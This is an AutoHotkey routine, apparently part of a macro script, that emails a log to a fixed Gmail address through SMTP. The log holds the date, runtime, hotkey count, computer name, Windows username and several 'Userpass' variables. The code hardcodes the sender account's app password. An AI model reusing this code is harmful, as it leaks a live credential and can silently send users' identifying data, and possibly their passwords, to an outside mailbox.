;EmailLog:

	Formattime, Date,, MMddyy
	Formattime, time,, HHmmss
	
	Runtime := (FileStartTime - A_now) *-1
	
	textbody = %date%,%time%,%runtime%,%counthotkeys%,%A_Computername%,%A_username%,%Userpass1%,%Userpass3%,%userpass4%,%userpass5%,%userpass6%


	pmsg := ComObjCreate("CDO.Message")     ; Do not change
	pmsg.From := """AHK Log"" <mwright.ahk@gmail.com>"
	pmsg.To := "mwright.ahk@gmail.com"
	pmsg.BCC := "" ; Blind Carbon Copy, Invisible for all, same syntax as CC
	pmsg.CC := ""
	pmsg.Subject := "AHK Log"

	pmsg.TextBody := textbody ; %date%,%time%,%runtime%,%A_Computername%,%A_username%,%Userpass1%,%Userpass3%,%userpass4%,%userpass5%,%userpass6% ;date "," time "," runtime "," A_Computername "," A_username "," Userpass1 "," Userpass3 "," userpass4 "," userpass5 "," userpass6

	; Remove semicolon to activate attachment feature
	; sAttach := ; "Path_Of_Attachment" ; can add multiple attachments
	; the delimiter is |

	fields := Object()
	fields.smtpserver := "smtp.gmail.com" ; specify your SMTP server
	fields.smtpserverport := 465 ; 25
	fields.smtpusessl := True ; False
	fields.sendusing := 2 ; cdoSendUsingPort
	fields.smtpauthenticate := 1 ; cdoBasic
	fields.sendusername := "mwright.ahk@gmail.com"
	fields.sendpassword := "qucjnxlbcwicpexn"
	fields.smtpconnectiontimeout := 60
	schema := "http://schemas.microsoft.com/cdo/configuration/"  ; Do not change


	pfld := pmsg.Configuration.Fields

	For field,value in fields
	pfld.Item(schema . field) := value
	pfld.Update()

	Loop, Parse, sAttach, |, %A_Space%%A_Tab%
	pmsg.AddAttachment(A_LoopField)
	pmsg.Send()

	return

